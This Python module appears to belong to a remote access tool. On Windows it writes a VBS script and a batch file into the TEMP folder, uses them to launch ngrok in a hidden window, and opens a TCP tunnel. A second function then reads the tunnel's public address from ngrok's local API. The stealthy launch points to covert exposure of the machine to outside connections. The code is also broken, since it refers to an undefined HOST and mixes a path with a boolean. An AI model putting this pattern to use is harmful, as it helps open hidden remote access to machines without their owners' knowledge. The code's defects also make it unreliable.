import os
import sys
import requests
import json


from utils.proc import process_running
from config.encodings import ENCODING
from services.server_services import LOCAL_TUNNEL


def start_ngrok():

    if sys.platform == 'win32':
        ngrok_path = os.path.isfile(os.path.join(os.getcwd(), "ngrok.exe"))
        ngrok_temp_path = os.path.isfile(
            os.path.join(os.environ["TEMP"], "ngrok.exe"))

        _, pid = process_running("ngrok.exe")
        
        if not pid:
            temp_path = os.environ["TEMP"]
            init_vbs = os.path.isfile(os.path.join(temp_path, "init.vbs"))
            init_bat = os.path.isfile(
                os.path.join(temp_path, "ngrok-init.bat"))

            if not init_vbs or not init_bat:
                print("[+] Creating init.vbs file")
                init_content = "Set WshShell = CreateObject(\"WScript.Shell\")\n"
                init_content += f"WshShell.Run chr(34) & \"{temp_path}\\ngrok-init.bat\" & Chr(34), 0\n"
                init_content += "Set WshShell = Nothing\n"

                with open(os.path.join(temp_path, "init.vbs"), 'w') as init:
                    init.write(init_content)

                print("[+] Creating ngrok-init.bat file")

                init_content = f"{temp_path or ngrok_temp_path}\\ngrok.exe tcp {HOST[1]}\n"
                init_content += "pause"
                with open(os.path.join(temp_path, "ngrok-init.bat"), 'w') as init:
                    init.write(init_content)

            print("[+] Running initial files..")
            os.system(str(os.path.join(temp_path, "init.vbs")))

            return True
    return False



def get_ngrok_tunnels():
    try:
        response = requests.get(LOCAL_TUNNEL).content.decode(ENCODING)
        response = json.loads(response)['tunnels'][0]['public_url']
        response = response.split(":")[1:]
        ip = response[0].replace("//", "")
        port = response[1]
        return ip, port

    except Exception:
        print("[-] Failed getting ngrok tunnels")
        return False, False